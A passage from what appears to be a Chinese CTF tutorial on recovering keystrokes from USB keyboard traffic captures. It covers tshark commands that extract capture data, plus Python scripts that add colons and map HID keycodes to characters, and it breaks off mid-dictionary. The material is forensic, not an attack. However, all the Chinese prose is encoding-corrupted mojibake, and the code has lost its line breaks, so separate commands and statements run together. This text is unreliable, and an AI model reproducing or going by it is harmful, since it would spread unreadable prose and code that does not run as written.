çš„åˆ†ç»„è¯¦æƒ…çª—å£ä¸­æŸ¥çœ‹</p><p>å¯å‚è€ƒçš„å·¥å…·ï¼š<a href="https://github.com/FzWjScJ/knm">FzWjScJ&#x2F;knm: é¼ æ ‡é”®ç›˜æµé‡åŒ…å–è¯</a></p><p>å‚è€ƒæ–‡çŒ®ï¼š<a href="https://cloud.tencent.com/developer/article/2036237">CTFæµé‡åˆ†æå¸¸è§é¢˜å‹(äºŒ)-USBæµé‡-è…¾è®¯äº‘å¼€å‘è€…ç¤¾åŒº-è…¾è®¯äº‘</a></p></blockquote><h2 id="é”®ç›˜æµé‡"><a href="#é”®ç›˜æµé‡" class="headerlink" title="é”®ç›˜æµé‡"></a>é”®ç›˜æµé‡</h2><blockquote><p><strong>é”®ç›˜æµé‡çš„æ•°æ®é•¿åº¦ä¸º 8 ä¸ªå­—èŠ‚</strong>ï¼Œé›†ä¸­åœ¨ <code>Leftover Capture Data</code> åŸŸçš„ç¬¬ 3 ä¸ªå­—èŠ‚ä¸­</p></blockquote><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-Misc_%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%9010.png" alt="CTF-Misc_æµé‡åˆ†æ10.png"></p><p>åœ¨ Kali Linux ä¸‹é€šè¿‡ <code>tshark</code> å‘½ä»¤å°†é”®ç›˜æ•°æ®æå–å‡ºæ¥</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">tshark <span class="token parameter variable">-r</span> usb.pcap <span class="token parameter variable">-T</span> fields <span class="token parameter variable">-e</span> usb.capdata <span class="token operator">></span> usbdata.txttshark <span class="token parameter variable">-r</span> usb.pcap <span class="token parameter variable">-T</span> fields <span class="token parameter variable">-e</span> usb.capdata <span class="token operator">|</span> <span class="token function">sed</span> <span class="token string">'/^\s*$/d'</span> <span class="token operator">></span> usbdata.txt <span class="token comment">#æå–å¹¶å»é™¤ç©ºè¡Œ</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>Kali Linux è‡ªå¸¦ tsharkï¼ŒUbuntu åˆ™éœ€è¦æ‰‹åŠ¨å®‰è£…ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> update  <span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> <span class="token parameter variable">-y</span> tshark<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></blockquote><p><em>æå–å‡ºæ¥çš„æ•°æ®æœ‰å†’å·æ—¶ï¼Œ[6:8] ä»£è¡¨é”®ç›˜å‡»é”®ä¿¡æ¯ï¼›æ²¡æœ‰å†’å·æ—¶ï¼Œ[4:6] ä»£è¡¨é”®ç›˜å‡»é”®ä¿¡æ¯</em></p><p>åŠ äº†å†’å·çš„æ•°æ®ç±»ä¼¼äºï¼š<code>00:00:03:00:00:00:00:00</code>ï¼Œå¦‚æœæå–å‡ºæ¥çš„æ•°æ®ä¸å¸¦å†’å·ï¼Œå¯ä»¥é€šè¿‡è„šæœ¬æ·»åŠ å†’å·ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'usbdata.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span>fi <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'out.txt'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>    a <span class="token operator">=</span> f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> a<span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">16</span><span class="token punctuation">:</span> <span class="token comment"># å¦‚æœæ˜¯é¼ æ ‡æµé‡ len æ”¹ä¸º 8</span>            out <span class="token operator">=</span> <span class="token string">''</span>            <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> i <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">!=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">:</span>                    out <span class="token operator">+=</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> a<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">":"</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    out <span class="token operator">+=</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> a<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span>            fi<span class="token punctuation">.</span>write<span class="token punctuation">(</span>out<span class="token punctuation">)</span>            fi<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>fi<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ ¹æ®åŠ äº†å†’å·çš„é”®ç›˜æ•°æ®ï¼Œä½¿ç”¨è„šæœ¬ä¸€å’Œè„šæœ¬äºŒè¿˜åŸå‡»é”®ä¿¡æ¯</p><p>è„šæœ¬ä¸€ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">mappings <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token number">0x04</span><span class="token punctuation">:</span> <span class="token string">"A"</span><span class="token punctuation">,</span> <span class="token number">0x05</span><span class="token punctuation">:</span> <span class="token string">"B"</span><span class="token punctuation">,</span> <span class="token number">0x06</span><span class="token punctuation">:</span> <span class="token string">"C"</span><span class="token punctuation">,</span> <span class="token number">0x07</span><span class="token punctuation">:</span> <span class="token string">"D"</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">:</span> <span class="token string">"E"</span><span class="token punctuation">,</span> <span class="token number">0x09</span><span class="token punctuation">:</span> <span class="token string">"F"</span><span class="token punctuation">,</span> <span class="token number">0x0A</span><span class="token punctuation">:</span> <span class="token string">"G"</span><span class="token punctuation">,</span> <span class="token number">0x0B</span><span class="token punctuation">:</span> <span class="token string">"H"</span><span class="token punctuation">,</span> <span class="token number">0x0C</span><span class="token punctuation">:</span> <span class="token string">"I"</span><span class="token punctuation">,</span> <span class="token number">0x0D</span><span class="token punctuation">:</span> <span class="token string">"J"</span><span class="token punctuation">,</span>    <span class="token number">0x0E</span><span class="token punctuation">:</span> <span class="token string">"K"</span><span class="token punctuation">,</span>    <span class="token number">0x0F</span><span class="token punctuation">:</span> <span class="token string">"L"</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">:</span> <span class="token string">"M"</span><span class="token punctuation">,</span> <span class="token number">0x11</span><span class="token punctuation">:</span> <span class="token string">"N"</span><span class="token punctuation">,</span> <span class="token number">0x12</span><span class="token punctuation">:</span> <span class="token string">"O"</span><span class="token punctuation">,</span> <span class="token number">0x13</span><span class="token punctuation">:</span> <span class="token string">"P"</span><span class="token punctuation">,</span> <span class="token number">0x14</span><span class="token punctuation">:</span> <span class="token string">"Q"</span><span class="token punctuation">,</span> <span class="token number">0x15</span><span class="token punctuation">:</span> <span class="token string">"R"</span><span class="token punctuation">,</span> <span class="token number">0x16</span><span class="token punctuation">:</span> <span class="token string">"S"</span><span class="token punctuation">,</span> <span class="token number">0x17</span><span class="token punctuation">:</span> <span class="token string">"T"</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">:</span> <span class="token string">"U"</span><span class="token punctuation">,</span>    <span class="token number">0x19</span><span class="token punctuation">:</span> <span class="token string">"V"</span><span class="token punctuation">,</span>    <span class="token number">0x1A</span><span class="token punctuation">:</span> <span class="token string">"W"</span><span class="token punctuation">,</span> <span class="token number">0x1B</span><span class="token punctuation">:</span> <span class="token string">"X"</span><span class="token punctuation">,</span> <span class="token number">0x1C</span><span class="token punctuation">:</span> <span class="token string">"Y"</span><span class="token punctuation">,</span> <span class="token number">0x1D</span><span class="token punctuation">:</span> <span class="token string">"Z"</span><span class="token punctuation">,</span> <span class="token number">0x1E</span><span class="token punctuation">:</span> <span class="token string">"1"</span><span class="token punctuation">,</span> <span class="token number">0x1F</span><span class="token punctuation">:</span> <span class="token string">"2"</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">:</span> <span class="token string">"3"</span><span class="token punctuation">,</span> <span class="token number">0x21</span><span class="token punctuation">:</span> <span class="token string">"4"</span><span class="token punctuation">,</span> <span class="token number">0x22</span><span class="token punctuation">:</span> <span class="token string">"5"</span><span class="token punctuation">,</span> <span class="token number">0x23</span><span class="token punctuation">:</span> <span class="token string">"6"</span><span class="token punctuation">,</span>    <span class="token number">0x24</span><span class="token punctuation">:</span> <span class="token string">"7"</span><span class="token punctuation">,</span>    <span class="token number">0x25</span><span class="token punctuation">:</span> <span class="token string">"8"</span><span class="token punctuation">,</span> <span class="token number">0x26</span><span class="token punctuation">:</span> <span class="token string">"9"</span><span class="token punctuation">,</span> <span class="token number">0x27</span><span class="token punctuation">:</span> <span class="token string">"0"</span><span class="token punctuation">,</span> <span class="token number">0x28</span><span class="token punctuation">:</span> <span class="token string">"\n"</span><span class="token punctuation">,</span> <span class="token number">0x2a</span><span class="token punctuation">:</span> <span class="token string">"[DEL]"</span><span class="token punctuation">,</span> <span class="token number">0X2B</span><span class="token punctuation">:</span> <span class="token string">" "</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">:</span> <span class="token string">" "</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">:</span> <span class="token string">"-"</span><span class="token punctuation">,</span> <span class="token number">0x2E</span><span class="token punctuation">:</span> <span class="token string">"="</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">:</span> <span class="token string">"["</span><span class="token punctuation">,</span>    <span class="token number">0x30</span><span class="token punctuation">:</span> <span class="token string">"]"</span><span class="token punctuation">,</span> <span class="token number">0x31</span><span class="token punctuation">:</span> <span class="token string">"\\"</span><span class="token punctuation">,</span> <span class="token number">0x32</span><span class="token punctuation">:</span> <span class="token string">"~"</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">:</span> <span class="token string">";"</span><span class="token punctuation">,</span> <span class="token number">0x34</span><span class="token punctuation">:</span> <span class="token string">"'"</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">:</span> <span class="token string">","</span><span class="token punctuation">,</span> <span class="token number">0x37</span><span class="token punctuation">:</span> <span class="token string">"."</span><span class="token punctuation">&#125;</span>nums <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>keys <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'out.txt'</span><span class="token punctuation">)</span><span class="token keyword">for</span> line <span class="token keyword">in</span> keys<span class="token punctuation">:</span>    <span class="token keyword">if</span> line<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'0'</span><span class="token punctuation">:</span>        <span class="token keyword">continue</span>    nums<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>line<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span>keys<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>output <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> n <span class="token keyword">in</span> nums<span class="token punctuation">:</span>    <span class="token keyword">if</span> n <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">continue</span>    <span class="token keyword">if</span> n <span class="token keyword">in</span> mappings<span class="token punctuation">:</span>        output <span class="token operator">+=</span> mappings<span class="token punctuation">[</span>n<span class="token punctuation">]</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        output <span class="token operator">+=</span> <span class="token string">'[unknown]'</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'output :'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è„šæœ¬äºŒï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">normalKeys <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"04"</span><span class="token punctuation">:</span> <span class="token string">"a"</span><span class="token punctuation">,</span> <span class="token string">"05"</span><span class="token punctuation">:</span> <span class="token string">"b"</span><span class="token punctuation">,</span> <span class="token string">"06"</span><span class="token punctuation">:</span> <span class="token string">"c"</span><span class="token punctuation">,</span> <span class="token string">"07"</span><span class="token punctuation">:</span> <span class="token string">"d"</span><span class="token punctuation">,</span> <span class="token string">"08"</span><span class="token punctuation">:</span> <span class="token string">"e"</span><span class="token punctuation">,</span>    <span class="token string">"09"</span><span class="token punctuation">:</span> <span class="token string">"f"</span><span class="token punctuation">,</span> <span class="token string">"0a"</span><span class="token punctuation">:</span> <span class="token string">"g"</span><span class="token punctuation">,</span> <span class="token string">"0b"</span><span class="token punctuation">:</span> <span class="token string">"h"</span><span class="token punctuation">,</span> <span class="token string">"0c"</span><span class="token punctuation">:</span> <span class="token string">"i"</span><span class="token punctuation">,</span> <span class="token string">"0d"</span><span class="token punctuation">:</span> <span class="token string">"j"</span><span class="token punctuation">,</span>    <span class="token string">"0e"</span><span class="token punctuation">:</span> <span class="token string">"k"</span><span class="token punctuation">,</span> <span class="token string">"0f"</span><span class="token punctuation">:</span> <span class="token string">"l"</span><span class="token punctuation">,</span> <span class="token string">"10"</span><span class="token punctuation">:</span> <span class="token string">"m"</span><span class="token punctuation">,</span> <span class="token string">"11"</span><span class="token punctuation">:</span> <span class="token string">"n"</span><span class="token punctuation">,</span> <span class="token string">"12"</span><span class="token punctuation">:</span> <span class="token string">"o"</span><span class="token punctuation">,</span>    <span class="token string">"13"</span><span class="token punctuation">:</span> <span class="token string">"p"</span><span class="token punctuation">,</span> <span class="token string">"14"</span><span class="token punctuation">:</span> <span class="token string">"q"</span><span class="token punctuation">,</span> <span class="token string">"15"</span><span class="token punctuation">:</span> <span class="token string">"r"</span><span class="token punctuation">,</span> <span class="token string">"16"</span><span class="token punctuation">:</span> <span class="token string">"s"</span><span class="token punctuation">,</span> <span class="token string">"17"</span><span class="token punctuation">:</span> <span class="token string">"t"</span><span class="token punctuation">,</span>    <span class="token string">"18"</span><span class="token punctuation">:</span> <span class="token string">"u"</span><span class="token punctuation">,</span> <span class="token string">"19"</span><span class="token punctuation">:</span> <span class="token string">"v"</span><span class="token punctuation">,</span> <span class="token string">"1a"</span><span class="token punctuation">:</span> <span class="token string">"w"</span><span class="token punctuation">,</span> <span class="token string">"1b"</span><span class="token punctuation">:</span> <span class="token string">"x"</span><span class="token punctuation">,</span> <span class="token string">"1c"</span><span class="token punctuation">:</span> <span class="token string">"y"</span><span class="token punctuation">,</span>    <span class="token string">"1d"</span><span class="token punctuation">:</span> <span class="token string">"z"</span><span class="token punctuation">,</span> <span class="token string">"1e"</span><span class="token punctuation">:</span> <span class="token string">"1"</span><span class="token punctuation">,</span> <span class="token string">"1f"</span><span class="token punctuation">:</span> <span class="token string">"2"</span><span class="token punctuation">,</span> <span class="token string">"20"</span><span class="token punctuation">:</span> <span class="token string">"3"</span><span class="token punctuation">,</span> <span class="token string">"21"</span><span class="token punctuation">:</span> <span class="token string">"4"</span><span class="token punctuation">,</span>    <span class="token string">"22"</span><span class="token punctuation">:</span> <span class="token string">"5"</span><span class="token punctuation">,</span> <span class="token string">"23"</span><span class="token punctuation">:</span> <span class="token string">"6"</span><span class="token punctuation">,</span> <span class="token string">"24"</span><span class="token punctuation">:</span> <span class="token string">"7"</span><span class="token punctuation">,</span> <span class="token string">"25"</span><span class="token punctuation">:</span> <span class="token string">"8"</span><span class="token punctuation">,</span> <span class="token string">"26"</span><span class="token punctuation">:</span> <span class="token string">"9"</span><span class="token punctuation">,</span>    <span class="token string">"27"</span><span class="token punctuation">:</span> <span class="token string">"0"</span><span class="token punctuation">,</span> <span class="token string">"28"</span><span class="token punctuation">:</span> <span class="token string">"&lt;RET>"</span><span class="token punctuation">,</span> <span class="token string">"29"</span><span class="token punctuation">:</span> <span class="token string">"&lt;ESC>"</span><span class="token punctuation">,</span> <span class="token string">"2a"</span><span class="token punctuation">:</span> <span class="token string">"&lt;DEL>"</span><span class="token punctuation">,</span> <span class="token string">"2b"</span><span class="token punctuation">:</span> <span class="token string">"\t"</span><span class="token punctuation">,</span>    <span class="token string">"2c"</span><span class="token punctuation">:</span> <span class="token string">"&lt;SPACE>"</span><span class="token punctuation">,</span> <span class="token string">"2d"</span><span class="token punctuation">:</span> <span class="token string">"-"</span><span class="token punctuation">,</span> <span class="token string">"2e"</span><span class="token punctuation">:</span> <span class="token string">"="</span><span class="token punctuation">,</span> <span class="token string">"2f"</span><span class="token punctuation">:</span> <span class="token string">"["</span><span class="token punctuation">,</span> <span class="token string">"30"</span><span class="token punctuation">:</span> <span class="token string">"]"</span><span class="token punctuation">,</span> <span class="token string">"31"</span><span class="token punctuation">:</span> <span class="token string">"\\"</span><span class="token punctuation">,</span>    <span class="token string">"32"</span><span class="token punctuation">:</span> <span class="token string">"&lt;NON>"</span><span class="token punctuation">,</span> <span class="token string">"33"</span><span class="token punctuation">:</span> <span class="token string">";"</span><span class="token punctuation">,</span> <span class="token string">"34"</span><span class="token punctuation">:</span> <span class="token string">"'"</span><span class="token punctuation">,</span> <span class="token string">"35"</span><span class="token punctuation">:</span> <span class="token string">"&lt;GA>"</span><span class="token punctuation">,</span> <span class="token string">"36"</span><span class="token punctuation">:</span> <span class="token string">","</span><span class="token punctuation">,</span> <span class="token string">"37"</span><span class="token punctuation">:</span> <span class="token string">"."</span><span class="token punctuation">,</span>    <span class="token string">"38"</span><span class="token punctuation">:</span> <span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token string">"39"</span><span class="token punctuation">:</span> <span class="token string">"&lt;CAP>"</span><span class="token punctuation">,</span> <span class="token string">"3a"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F1>"</span><span class="token punctuation">,</span> <span class="token string">"3b"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F2>"</span><span class="token punctuation">,</span> <span class="token string">"3c"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F3>"</span><span class="token punctuation">,</span> <span class="token string">"3d"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F4>"</span><span class="token punctuation">,</span>    <span class="token string">"3e"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F5>"</span><span class="token punctuation">,</span> <span class="token string">"3f"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F6>"</span><span class="token punctuation">,</span> <span class="token string">"40"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F7>"</span><span class="token punctuation">,</span> <span class="token string">"41"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F8>"</span><span class="token punctuation">,</span> <span class="token string">"42"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F9>"</span><span class="token punctuation">,</span> <span class="token string">"43"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F10>"</span><span class="token punctuation">,</span>    <span class="token string">"44"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F11>"</span><span class="token punctuation">,</span> <span class="token string">"45"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F12>"</span><span class="token punctuation">&#125;</span>shiftKeys <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"04"</span><span class="token punctuation">:</span> <span class="token string">"A"</span><span class="token punctuation">,</span> <span class="token string">"05"</span><span class="token punctuation">:</span> <span class="token string">"B"</span><span class="token punctuation">,</span> <span class="token string">"06"</span><span class="token punctuation">:</span> <span class="token string">"C"</span><span class="token punctuation">,</span> <span class="token string">"07"</span><span class="token punctuation">:</span> <span class="token string">"D"</span><span class="token punctuation">,</span> <span class="token string">"08"</span><span class="token punctuation">:</span> <span class="token string">"E"</span><span class="token punctuation">,</span>    <span class="token string">"09"</span><span class="token punctuation">:</span> <span class="token string">"F"</span><span class="token punctuation">,</span> <span class="token string">"0a"</span><span class="token punctuation">:</span> <span class="token string">"G"</span><span class="token punctuation">,</span> <span class="token string">"0b"</span><span class="token punctuation">:</span> <span class="token string">"H"</span><span class="token punctuation">,</span> <span class="token string">"0c"</span><span class="token punctuation">:</span> <span class="token string">"I"</span><span class="token punctuation">,</span> <span class="token string">"0d"</span><span class="token punctuation">:</span> <span class="token string">"J"</span><span class="token punctuation">,</span>    <span class="token string">"0e"</span><span class="token punctuation">:</span> <span class="token string">"K"</span><span class="token punctuation">,</span> <span class="token string">"0f"</span><span class="token punctuation">:</span> <span class="token string">"L"</span><span class="token punctuation">,</span> <span class="token string">"10"</span><span class="token punctuation">:</span> <span class="token string">"M"</span><span class="token punctuation">,</span> <span class="token string">"11"</span><span class="token punctuation">:</span> <span class="token string">"N"</span><span class="token punctuation">,</span> <span class="token string">"12"</span><span class="token punctuation">:</span> <span class="token string">"O"</span><span class="token punctuation">,</span>    <span class="token string">"13"</span><span class="token punctuation">:</span> <span class="token string">"P"</span><span class="token punctuation">,</span> <span class="token string">"14"</span><span class="token punctuation">:</span> <span class="token string">"Q"</span><span class="token punctuation">,</span> <span class="token string">"15"</span><span class="token punctuation">:</span> <span class="token string">"R"</span><span class="token punctuation">,</span> <span class="token string">"16"</span><span class="token punctuation">:</span> <span class="token string">"S"</span><span class="token punctuation">,</span> <span class="token string">"17"</span><span class="token punctuation">:</span> <span class="token string">"T"</span><span class="token punctuation">,</span>    <span class="token string">"18"</span><span class="token punctuation">:</span> <span class="token string">"U"</span><span class="token punctuation">,</span> <span class="token string">"19"</span><span class="token punctuation">:</span> <span class="token string">"V"</span><span class="token punctuation">,</span> <span class="token string">"1a"</span><span class="token punctuation">:</span> <span class="token string">"W"</span><span class="token punctuation">,</span> <span class="token string">"1b"</span><span class="token punctuation">:</span> <span class="token string">"X"</span><span class="token punctuation">,</span> <span class="token string">"1c"</span><span class="token punctuation">:</span> <span class="token string">"Y"</span><span class="token punctuation">,</span>    <span class="token string">"1d"</span><span class="token punctuation">:</span> <span class="token string">"Z"</span><span class="token punctuation">,</span> <span class="token string">"1e"</span><span class="token punctuation">:</span> <span class="token string">"!"</span><span class="token punctuation">,</span> <span class="token string">"1f"</span><span class="token punctuation">:</span> <span class="token string">"@"</span><span class="token punctuation">,</span> <span class="token string">"20"</span><span class="token punctuation">:</span> <span class="token string">"#"</span><span class="token punctuation">,</span> <span class="token string">"21"</span><span class="token punctuation">:</span> <span class="token string">"$"</span><span class="token punctuation">,</span>    <span class="token string">"22"</span><span class="token punctuation">:</span> <span class="token string">"%"</span><span class="token punctuation">,</span> <span class="token string">"23"</span><span class="token punctuation">:</span> <span class="token string">"^"</span><span class="token punctuation">,</span> <span class="token string">"24"</span><span class="token punctuation">:</span> <span class="token string">"&amp;"</span><span class="token punctuation">,</span> <span class="token string">"25"</span><span class="token punctuation">:</span> <span class="token string">"*"</span><span class="token punctuation">,</span> <span class="token string">"26"</span><span class="token punctuation">:</span> <span class="token string">"("</span><span class="token punctuation">,</span> <span class="token string">"27"</span><span class="token punctuation">:</span> <span class="token string">")"</span><span class="token punctuation">,</span>    <span class="token string">"28"</span><span class="token punctuation">:</span> <span class="token string">"&lt;RET>"</span><span class="token punctuation">,</span> <span class="token string">"29"</span><span class="token punctuation">:</span> <span class="token string">"&lt;ESC>"</span><span class="token punctuation">,</span> <span class="token string">"2a"</span><span class="token punctuation">:</span> <span class="token string">"&lt;DEL>"</span><span class="token punctuation">,</span> <span class="token string">"2b"</span><span class="token punctuation">:</span> <span class="token string">"\t"</span><span class="token punctuation">,</span> <span class="token string">"2c"</span><span class="token punctuation">:</span> <span class="token string">"&lt;SPACE>"</span><span class="token punctuation">,</span>    <span class="token string">"2d"</span><span class="token punctuation">:</span> <span class="token string">"_"</span><span class="token punctuation">,</span> <span class="token string">"2e"</span><span class="token punctuation">:</span> <span class="token string">"+"</span><span class="token punctuation">,</span> <span class="token string">"2f"</span><span class="token punctuation">:</span> <span class="token string">"&#123;"</span><span class="token punctuation">,</span> <span class="token string">"30"</span><span class="token punctuation">:</span> <span class="token string">"&#125;"</span><span class="token punctuation">,</span> <span class="token string">"31"</span><span class="token punctuation">:</span> <span class="token string">"|"</span><span class="token punctuation">,</span> <span class="token string">"32"</span><span class="token punctuation">:</span> <span class="token string">"&lt;NON>"</span><span class="token punctuation">,</span> <span class="token string">"33"</span><span class="token punctuation">:</span> <span class="token string">"\""</span><span class="token punctuation">,</span>    <span class="token string">"34"</span><span class="token punctuation">:</span> <span class="token string">":"</span><span class="token punctuation">,</span> <span class="token string">"35"</span><span class="token punctuation">:</span> <span class="token string">"&lt;GA>"</span><span class="token punctuation">,</span> <span class="token string">"36"</span><span class="token punctuation">:</span> <span class="token string">"&lt;"</span><span class="token punctuation">,</span> <span class="token string">"37"</span><span class="token punctuation">:</span> <span class="token string">">"</span><span class="token punctuation">,</span> <span class="token string">"38"</span><span class="token punctuation">:</span> <span class="token string">"?"</span><span class="token punctuation">,</span> <span class="token string">"39"</span><span class="token punctuation">:</span> <span class="token string">"&lt;CAP>"</span><span class="token punctuation">,</span> <span class="token string">"3a"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F1>"</span><span class="token punctuation">,</span>    <span class="token string">"3b"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F2>"</span><span class="token punctuation">,</span> <span class="token string">"3c"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F3>"</span><span class="token punctuation">,</span> <span class="token string">"3d"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F4>"</span><span class="token punctuation">,</span> <span class="token string">"3e"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F5>"</span><span class="token punctuation">,</span> <span class="token string">"3f"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F6>"</span><span class="token punctuation">,</span> <span class="token string">"40"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F7>"</span><span class="token punctuation">,</span>    <span class="token string">"41"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F8>"</span><span class="token punctuation">,</span> <span class="token string">"42"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F9>"</span><span class="token punctuation">,</span> <span class="token string">"43"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F10>"</span><span class="token punctuation">,</span> <span class="token string">"44"</span><span 